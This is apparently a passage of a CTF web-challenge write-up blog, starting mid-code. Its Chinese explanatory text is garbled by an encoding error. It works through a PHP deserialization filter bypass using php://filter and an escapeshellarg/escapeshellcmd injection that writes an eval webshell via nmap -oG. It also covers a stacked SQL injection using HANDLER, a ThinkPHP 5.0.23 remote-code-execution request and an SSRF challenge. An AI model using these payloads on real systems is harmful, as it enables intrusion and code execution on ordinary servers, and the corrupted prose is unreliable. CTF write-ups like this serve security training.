&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;write();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">"2"</span>) &#123;</span><br><span class="line">            $res = <span class="keyword">$this</span>-&gt;read();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output($res);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">"Bad Hacker!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename) &amp;&amp; <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;content)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(strlen((string)<span class="keyword">$this</span>-&gt;content) &gt; <span class="number">100</span>) &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;output(<span class="string">"Too long!"</span>);</span><br><span class="line">                <span class="keyword">die</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            $res = file_put_contents(<span class="keyword">$this</span>-&gt;filename, <span class="keyword">$this</span>-&gt;content);</span><br><span class="line">            <span class="keyword">if</span>($res) <span class="keyword">$this</span>-&gt;output(<span class="string">"Successful!"</span>);</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">$this</span>-&gt;output(<span class="string">"Failed!"</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">"Failed!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $res = <span class="string">""</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename)) &#123;</span><br><span class="line">            $res = file_get_contents(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">output</span><span class="params">($s)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"[Result]: &lt;br&gt;"</span>;</span><br><span class="line">        <span class="keyword">echo</span> $s;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op === <span class="string">"2"</span>)</span><br><span class="line">            <span class="keyword">$this</span>-&gt;op = <span class="string">"1"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;content = <span class="string">""</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span><span class="params">($s)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; strlen($s); $i++)</span><br><span class="line">        <span class="keyword">if</span>(!(ord($s[$i]) &gt;= <span class="number">32</span> &amp;&amp; ord($s[$i]) &lt;= <span class="number">125</span>))</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET&#123;<span class="string">'str'</span>&#125;)) &#123;</span><br><span class="line"></span><br><span class="line">    $str = (string)$_GET[<span class="string">'str'</span>];</span><br><span class="line">    <span class="keyword">if</span>(is_valid($str)) &#123;</span><br><span class="line">        $obj = unserialize($str);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>ç®€å•çš„ååºåˆ—é¢˜+LFIï¼Œå…³é”®å°±åœ¨äº<code>is_valid</code>å‡½æ•°çš„ç»•è¿‡ã€‚</p>
<p>æ­¤å‡½æ•°é™åˆ¶äº†payloadå¯¹åº”çš„asciiç åŒºé—´èŒƒå›´ã€‚</p>
<p>è‹¥æˆ‘ä»¬ç›´æ¥æ­£å¸¸çš„ä½¿ç”¨å¦‚ä¸‹payloadï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> $op=<span class="string">"2"</span>;</span><br><span class="line">    <span class="comment">//ç”±äºä¸çŸ¥é“flagçš„ç»å¯¹è·¯å¾„ï¼Œæ•…æ— æ³•ç›´æ¥è¯»å–flagï¼Œä½¿ç”¨LFIè¯»å–å³å¯</span></span><br><span class="line">    <span class="keyword">protected</span> $filename=<span class="string">"php://filter/read=convert.base64-encode/resource=flag.php"</span>;</span><br><span class="line">    <span class="keyword">protected</span> $content=<span class="string">"123"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> FileHandler();</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($a));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>ä¼šå‘ç°payloadä¸­æœ‰ä¸å¯è§å­—ç¬¦%00ï¼Œè¯¥å­—ç¬¦çš„asciiå€¼æ˜¯0ï¼Œä¼šè¢«<code>is_valid</code>æ‹¦æˆªã€‚</p>
<h3 id="æ³•ä¸€ï¼šphp7-1-ç‰ˆæœ¬å¯¹å±æ€§ç±»å‹ä¸æ•æ„Ÿ"><a href="#æ³•ä¸€ï¼šphp7-1-ç‰ˆæœ¬å¯¹å±æ€§ç±»å‹ä¸æ•æ„Ÿ" class="headerlink" title="æ³•ä¸€ï¼šphp7.1+ç‰ˆæœ¬å¯¹å±æ€§ç±»å‹ä¸æ•æ„Ÿ"></a>æ³•ä¸€ï¼šphp7.1+ç‰ˆæœ¬å¯¹å±æ€§ç±»å‹ä¸æ•æ„Ÿ</h3><p>ç›´æ¥ä¿®æ”¹ä¸ºpublicå±æ€§ï¼ŒEXPï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> $op=<span class="string">"2"</span>;</span><br><span class="line">    <span class="comment">//ç”±äºä¸çŸ¥é“flagçš„ç»å¯¹è·¯å¾„ï¼Œæ•…æ— æ³•ç›´æ¥è¯»å–flagï¼Œä½¿ç”¨LFIè¯»å–å³å¯</span></span><br><span class="line">    <span class="keyword">public</span> $filename=<span class="string">"php://filter/read=convert.base64-encode/resource=flag.php"</span>;</span><br><span class="line">    <span class="keyword">public</span> $content=<span class="string">"123"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> FileHandler();</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($a));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="æ³•äºŒï¼šä½¿ç”¨16è¿›åˆ¶ç»•è¿‡"><a href="#æ³•äºŒï¼šä½¿ç”¨16è¿›åˆ¶ç»•è¿‡" class="headerlink" title="æ³•äºŒï¼šä½¿ç”¨16è¿›åˆ¶ç»•è¿‡"></a>æ³•äºŒï¼šä½¿ç”¨16è¿›åˆ¶ç»•è¿‡</h3><p>å¯¹äº%00å‡ºç°çš„å±æ€§ï¼Œåªéœ€è¦å°†å˜é‡åå‰çš„å°å†™çš„<code>s</code>æ”¹æˆå¤§å†™çš„<code>S</code>ï¼Œå³å¯å°†å˜é‡åç”¨16è¿›åˆ¶è¡¨ç¤ºã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">å¦‚ï¼šs:11:&#39;%00*%00filename&#39;;</span><br><span class="line">è¡¨ç¤ºä¸ºï¼šS:11:&#39;\x00*\x00filename&#39;;</span><br></pre></td></tr></table></figure>
<h2 id="BUUCTF-2018-Online-Tool"><a href="#BUUCTF-2018-Online-Tool" class="headerlink" title="[BUUCTF 2018]Online Tool"></a>[BUUCTF 2018]Online Tool</h2><p>æ‰“å¼€é¢˜ç›®å¾—æºç ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>])) &#123;</span><br><span class="line">    $_SERVER[<span class="string">'REMOTE_ADDR'</span>] = $_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'host'</span>])) &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $host = $_GET[<span class="string">'host'</span>];</span><br><span class="line">    $host = escapeshellarg($host);</span><br><span class="line">    $host = escapeshellcmd($host);</span><br><span class="line">    $sandbox = md5(<span class="string">"glzjin"</span>. $_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'you are in sandbox '</span>.$sandbox;</span><br><span class="line">    @mkdir($sandbox);</span><br><span class="line">    chdir($sandbox);</span><br><span class="line">    <span class="keyword">echo</span> system(<span class="string">"nmap -T5 -sT -Pn --host-timeout 2 -F "</span>.$host);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>å‘½ä»¤æ‰§è¡Œé¢˜ï¼Œæœ¬é¢˜å…³é”®æ˜¯å¾—ç»•è¿‡<code>escapeshellarg</code>ä¸<code>escapeshellcmd</code>ã€‚</p>
<p>å…³é”®ç‚¹å†ä¸æ­¤å¤„è¿ç»­å¥—ç”¨äº†è½¬ä¹‰å‡½æ•°ï¼Œå¯¼è‡´å‡ºç°äº†ç”±æ­¤äº§ç”Ÿçš„bypassç»•è¿‡æ–¹æ³•ã€‚</p>
<p>å¯¹äº<code>$host=a&#39;b</code>æ¥è¯´</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">escapeshellargè½¬ä¹‰åä¸ºï¼š&#39;a\&#39;&#39;&#39;b&#39;</span><br><span class="line">è€Œåç»escapeshellcmdè½¬ä¹‰åä¸º: &#39;a\\&#39;&#39;&#39;b&#39;</span><br><span class="line">å¦‚æ­¤ä»¥æ¥ç‰‡ä¼šé€ æˆå¼•å·çš„é€ƒç¦»</span><br></pre></td></tr></table></figure>
<p>EXPï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?host&#x3D;&#39; &lt;?php @eval($_POST[&quot;cmd&quot;]);?&gt; -oG evil.php &#39;</span><br></pre></td></tr></table></figure>
<p>Nmapä¸­<code>-oG</code>å‚æ•°ä¹Ÿå°†è¾“å‡ºç»“æœå†™å…¥æ–‡ä»¶ï¼Œæˆ‘ä»¬åˆ©ç”¨æ­¤æ¥å†™å…¥ä¸€ä¸ªwebshellã€‚</p>
<p>ç„¶åç”¨èšå‰‘ç­‰webshellç®¡ç†å·¥å…·è¿æ¥è¯»å–flagå³å¯ã€‚</p>
<h2 id="GYCTF2020-Blacklist"><a href="#GYCTF2020-Blacklist" class="headerlink" title="[GYCTF2020]Blacklist"></a>[GYCTF2020]Blacklist</h2><p>å¼ºç½‘æ¯éšä¾¿æ³¨é­”æ”¹é¢˜ã€‚</p>
<p>è€ƒç‚¹ï¼šhandlerä»£æ›¿selectæŸ¥è¯¢ã€‚</p>
<blockquote>
<p>mysqlé™¤å¯ä½¿ç”¨selectæŸ¥è¯¢è¡¨ä¸­çš„æ•°æ®ï¼Œä¹Ÿå¯ä½¿ç”¨handlerè¯­å¥ï¼Œè¿™æ¡è¯­å¥ä½¿æˆ‘ä»¬èƒ½å¤Ÿä¸€è¡Œä¸€è¡Œçš„æµè§ˆä¸€ä¸ªè¡¨ä¸­çš„æ•°æ®ï¼Œä¸è¿‡handlerè¯­å¥å¹¶ä¸å…·å¤‡selectè¯­å¥çš„æ‰€æœ‰åŠŸèƒ½ã€‚å®ƒæ˜¯mysqlä¸“ç”¨çš„è¯­å¥ï¼Œå¹¶æ²¡æœ‰åŒ…å«åˆ°SQLæ ‡å‡†ä¸­ã€‚</p>
</blockquote>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">handler</span> <span class="keyword">users</span> <span class="keyword">open</span> <span class="keyword">as</span> yunensec; <span class="comment">#æŒ‡å®šæ•°æ®è¡¨è¿›è¡Œè½½å…¥å¹¶å°†è¿”å›å¥æŸ„é‡å‘½å</span></span><br><span class="line"><span class="keyword">handler</span> yunensec <span class="keyword">read</span> <span class="keyword">first</span>; <span class="comment">#è¯»å–æŒ‡å®šè¡¨/å¥æŸ„çš„é¦–è¡Œæ•°æ®</span></span><br><span class="line"><span class="keyword">handler</span> yunensec <span class="keyword">read</span> <span class="keyword">next</span>; <span class="comment">#è¯»å–æŒ‡å®šè¡¨/å¥æŸ„çš„ä¸‹ä¸€è¡Œæ•°æ®</span></span><br><span class="line"><span class="keyword">handler</span> yunensec <span class="keyword">read</span> <span class="keyword">next</span>; <span class="comment">#è¯»å–æŒ‡å®šè¡¨/å¥æŸ„çš„ä¸‹ä¸€è¡Œæ•°æ®</span></span><br><span class="line">...</span><br><span class="line"><span class="keyword">handler</span> yunensec <span class="keyword">close</span>; <span class="comment">#å…³é—­å¥æŸ„</span></span><br></pre></td></tr></table></figure>
<p>EXPï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39;;handler &#96;FlagHere&#96; open as yunensec;handler yunensec read first;#</span><br></pre></td></tr></table></figure>
<h2 id="BJDCTF-2nd-old-hack"><a href="#BJDCTF-2nd-old-hack" class="headerlink" title="[BJDCTF 2nd]old-hack"></a>[BJDCTF 2nd]old-hack</h2><p>æ‰“å¼€é¢˜ç›®ï¼Œå‘ç°é¡µé¢å­˜åœ¨Powered by THINKPHP5çš„æç¤ºã€‚</p>
<p>éšä¾¿è®¿é—®ä¸€ä¸ªæ§åˆ¶å™¨ï¼š<code>/index.php?s=/index/aaaa</code>ï¼Œåœ¨debugé¡µå¾—åˆ°tpç‰ˆæœ¬ä¸º5.0.23ã€‚</p>
<p>Googleä¸€ä¸‹tp5.0.23çš„æ¼æ´ï¼Œå‘ç°RCEä¸€æšã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># ThinkPHP &lt;&#x3D; 5.0.23ã€5.1.0 &lt;&#x3D; 5.1.16 éœ€è¦å¼€å¯æ¡†æ¶app_debug</span><br><span class="line">POST &#x2F;</span><br><span class="line">_method&#x3D;__construct&amp;filter[]&#x3D;system&amp;server[REQUEST_METHOD]&#x3D;ls -al</span><br></pre></td></tr></table></figure>
<p>æ‘˜è‡ªï¼š<a href="https://y4er.com/post/thinkphp5-rce/" target="_blank" rel="noopener">https://y4er.com/post/thinkphp5-rce/</a></p>
<p><img src= "/img/loading.gif" data-src="https://img.0x002.com/article/BuuCTF3/image-20200903140625859.png" alt="è¯»å–flag"></p>
<h2 id="De1CTF-2019-SSRF-Me"><a href="#De1CTF-2019-SSRF-Me" class="headerlink" title="[De1CTF 2019]SSRF Me"></a>[De1CTF 2019]SSRF Me</h2><p>é¢˜ç›®ç»™å‡ºHintï¼š<code>flag is in ./flag.txt</code>ã€‚</p>
<p>æ‰“å¼€é¢˜ç›®ç»™å‡ºæºä»£ç ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python </span></span><br><span class="line"><span class="comment">#encoding=utf-8 </span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask </span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request </span><br><span class="line"><span class="keyword">import</span> socket </span><br><span class="line"><span class="keyword">import</span> hashlib </span><br><span class="line"><span class="keyword">import</span> urllib </span><br><span class="line"><span class="keyword">import</span> sys </span><br><span class="line"><span class="keyword">import</span> os </span><br><span class="line"><span class="keyword">import</span> json </span><br><span class="line"></span><br><span class="line">reload(sys) </span><br><span class="line">sys.setdefaultencoding(<span class="string">'latin1'</span>) </span><br><span class="line"></span><br><span class="line">app = Flask(__name__) </span><br><span class="line"></span><br><span class="line">secert_key = os.urandom(<span class="number">16</span>) </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Task</span>:</span> </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, action, param, sign, ip)</span>:</span> </span><br><span class="line">        self.action = action </span><br><span class="line">        self.param = param </span><br><span class="line">        self.sign = sign </span><br><span class="line">        self.sandbox = md5(ip) </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">not</span> os.path.exists(self.sandbox)): </span><br><span class="line">            <span class="comment">#SandBox For Remote_Addr </span></span><br><span class="line">            os.mkdir(self.sandbox) </span><br><span class="line">            </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Exec</span><span class="params">(self)</span>:</span> </span><br><span class="line">        result = &#123;&#125; </span><br><span class="line">        result[<span class="string">'code'</span>] = <span class="number">500</span> </span><br><span class="line">        <span class="keyword">if</span> (self.checkSign()): </span><br><span class="line">            <span class="keyword">if</span> <span class="string">"scan"</span> <span class="keyword">in</span> self.action: </span><br><span class="line">                tmpfile = open(<span class="string">"./%s/result.txt"</span> % self.sandbox, <span class="string">'w'</span>) </span><br><span class="line">                resp = scan(self.param) </span><br><span class="line">                <span class="keyword">if</span> (resp == <span class="string">"Connection Timeout"</span>): </span><br><span class="line">                    result[<span class="string">'data'</span>] = resp </span><br><span class="line">                <span class="keyword">else</span>: </span><br><span class="line">                    <span class="keyword">print</span> resp tmpfile.write(resp) </span><br><span class="line">                    </span><br><span class="line">                tmpfile.close() </span><br><span class="line">                </span><br><span class="line">                result[<span class="string">'code'</span>] = <span class="number">200</span> </span><br><span class="line">                </span><br><span class="line">            <span class="keyword">if</span> <span class="string">"read"</span> <span class="keyword">in</span> self.action: </span><br><span class="line">                f = open(<span class="string">"./%s/result.txt"</span> % self.sandbox, <span class="string">'r'</span>) </span><br><span class="line">                result[<span class="string">'code'</span>] = <span class="number">200</span> </span><br><span class="line">                result[<span class="string">'data'</span>] = f.read() </span><br><span class="line">                <span class="keyword">if</span> result[<span class="string">'code'</span>] == <span class="number">500</span>: </span><br><span class="line">                    result[<span class="string">'data'</span>] = <span class="string">"Action Error"</span> </span><br><span class="line">                <span class="keyword">else</span>: </span><br><span class="line">                    result[<span class="string">'code'</span>] = <span class="number">500</span> </span><br><span class="line">                    result[<span class="string">'msg'</span>] = <span class="string">"Sign Error"</span> </span><br><span class="line">                    </span><br><span class="line">            <span class="keyword">return</span> result </span><br><span class="line">                </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">checkSign</span><span class="params">(self)</span>:</span> </span><br><span class="line">        <span class="keyword">if</span> (getSign(self.action, self.param) == self.sign): </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span> </span><br><span class="line">        <span class="keyword">else</span>: </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span> </span><br><span class="line"></span><br><span class="line"><span class="comment">#generate Sign For Action Scan. </span></span><br><span class="line"><span class="meta">@app.route("/geneSign", methods=['GET', 'POST']) </span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">geneSign</span><span class="params">()</span>:</span> </span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">"param"</span>, <span class="string">""</span>)) </span><br><span class="line">    action = <span class="string">"scan"</span> </span><br><span class="line">    <span class="keyword">return</span> getSign(action, param) </span><br><span class="line">    </span><br><span class="line"><span class="meta">@app.route('/De1ta',methods=['GET','POST']) </span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">challenge</span><span class="params">()</span>:</span> </span><br><span class="line">    action = urllib.unquote(request.cookies.get(<span class="string">"action"</span>)) </span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">"param"</span>, <span class="string">""</span>)) </span><br><span class="line">    sign = urllib.unquote(request.cookies.get(<span class="string">"sign"</span>)) </span><br><span class="line">    ip = request.remote_addr </span><br><span class="line">    <span class="keyword">if</span>(waf(param)): </span><br><span class="line">        <span class="keyword">return</span> <span class="string">"No Hacker!!!!"</span> </span><br><span class="line">    task = Task(action, param, sign, ip) </span><br><span class="line">    <span class="keyword">return</span> json.dumps(task.Exec()) </span><br><span class="line">    </span><br><span class="line"><span class="meta">@app.route('/') </span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span> </span><br><span class="line">    <span class="keyword">return</span> open(<span class="string">"code.txt"</span>,<span class="string">"r"</span>).read() </span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scan</span><span class="params">(param)</span>:</span> </span><br><span class="line">    socket.setdefaulttimeout(<span class="number">1</span>) </span><br><span class="line">    <span class="keyword">try</span>: </span><br><span class="line">        <span class="keyword">return</span> urllib.urlopen(param).read()[:<span class="number">50</span>] </span><br><span class="line">    <span class="keyword">except</span>: </span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Connection Timeout"</span> </span><br><span class="line">        </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getSign</span><span class="params">(action, param)</span>:</span> </span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest() </span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span><span class="params">(content)</span>:</span> </span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(content).hexdigest() </span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">waf</span><span class="params">(param)</span>:</span> </span><br><span class="line">    check=param.strip().lower() </span><br><span class="line">    <span class="keyword">if</span> check.startswith(<span class="string">"gopher"</span>) <span class="keyword">or</span> check.startswith(<span class="string">"file"</span>): </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span> </span><br><span class="line">    <span class="keyword">else</span>: </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span> </span><br><span class="line">        </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>: </span><br><span class="line">    app.debug = <span class="literal">False</span> app.run(host=<span class="string">'0.0.0.0'</span>,port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure>
<p>è€ƒç‚¹ï¼šMD5é•¿åº¦æ‹“å±•æ”»å‡»ã€local_fileåè®®ã€‚</p>
<p>åˆ©ç”¨é•¿åº¦æ‹“å±•æ”»å‡»ç»•è¿‡signçš„éªŒè¯ï¼Œå†åˆ©ç”¨<code>local_file</code>åè®®è¯»å–æ–‡ä»¶å†…å®¹(<code>file</code>åè®®ä¸ºå°è£…å¥½çš„<code>local_file</code>åè®®)å³å¯ï¼Œä¸è¿‡ç›´æ¥ä¸å¡«å†™ä»»ä½•åè®®ç›´æ¥è®©<code>param</code>ä¸º<code>flag.txt</code>ä¹Ÿå¯ä»¥ï¼Œå› ä¸ºå¦‚æœä¸å†™åè®®åç§°é»˜è®¤å³ä¸º<code>file</code>åè®®ã€‚</p>
<p>ç”±äºç¯‡å¹…é™åˆ¶ï¼Œè¿™é‡Œä¸è¿›è¡Œå¯¹hashé•¿åº¦æ‹“å±•æ”»å‡»çš„è§£è¯»ã€‚</p>
<h2 id="GKCTF2020-cveç‰ˆç­¾åˆ°"><a href="#GKCTF2020-cveç‰ˆç­¾åˆ°" class="headerlink" title="[GKCTF2020]cveç‰ˆç­¾åˆ°"></a>[GKCTF2020]cveç‰ˆç­¾åˆ°</h2><p>é¢˜ç›®ç»™å‡ºæç¤ºï¼šcve-2020-7066</p>
<p>é€šè¿‡æœç´¢å¼•æ“æŸ¥æ‰¾å¾—åˆ°å¦‚ä¸‹ä¿¡æ¯ï¼š<a href="https://bugs.php.net/bug.php?id=79329" target="_blank" rel="noopener">https://bugs.php.net/bug.php?id=79329</a></p>
<p><img src= "/img/loading.gif" data-src="https://img.0x002.com/article/BuuCTF3/image-20200917132843319.png" alt="image-20200917132843319"></p>
<p>å¯ä»¥çœ‹åˆ°åœ¨ä½äº7.2.29çš„PHPç‰ˆæœ¬7.2.xï¼Œä½äº7.3.16çš„7.3.xå’Œä½äº7.4.4çš„7.4.xä¸­<code>get_headers</code>å‡½æ•°å­˜åœ¨00æˆªæ–­é—®é¢˜ã€‚</p>
<p>é¢˜ç›®é¦–é¡µå‘Šè¯‰äº†æˆ‘ä»¬ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You just view *.ctfhub.com</span><br></pre></td></tr></table></figure>
